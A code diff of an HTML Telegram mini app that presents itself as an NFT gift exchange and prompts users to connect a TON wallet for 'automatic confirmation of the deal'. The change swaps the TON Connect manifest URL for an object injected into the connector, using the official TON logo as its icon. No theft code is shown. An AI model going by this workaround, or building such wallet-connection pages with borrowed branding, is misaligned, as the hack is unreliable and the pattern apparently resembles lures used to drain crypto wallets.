@@ -4,9 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>NFT Exchange Mini App</title>
-    <!-- Подключаем Telegram Web Apps API -->
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
-    <!-- Подключаем TON Connect UI -->
     <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
     <style>
         body {
@@ -38,7 +36,6 @@
     <h2>🔄 Обмен NFT Подарков</h2>
     <p>Подключите кошелек для автоматического подтверждения сделки</p>
 
-    <!-- Контейнер для кнопки подключения кошелька -->
     <div id="ton-connect-btn"></div>
 
     <br>
@@ -52,11 +49,18 @@
             tg.expand();
         }
 
-        // Инициализация TON Connect UI с твоим собственным манифестом
+        // Передаем манифест напрямую объектом, а не ссылкой на файл
         const tonConnectUI = new TONConnectUI.TonConnectUI({
-            manifestUrl: 'https://bannyslayser.github.io/my-nft-app/tonconnect-manifest.json',
+            manifestUrl: null, // Отключаем внешнюю ссылку
             buttonRootId: 'ton-connect-btn'
         });
+
+        // Принудительно задаем данные нашего Mini App внутри скрипта
+        tonConnectUI.connector.manifest = {
+            url: "https://bannyslayser.github.io/my-nft-app/",
+            name: "NFT Exchange",
+            iconUrl: "https://ton.org/front/img/ton_logo.svg"
+        };
 
         const sendBtn = document.getElementById('send-nft-btn');
 
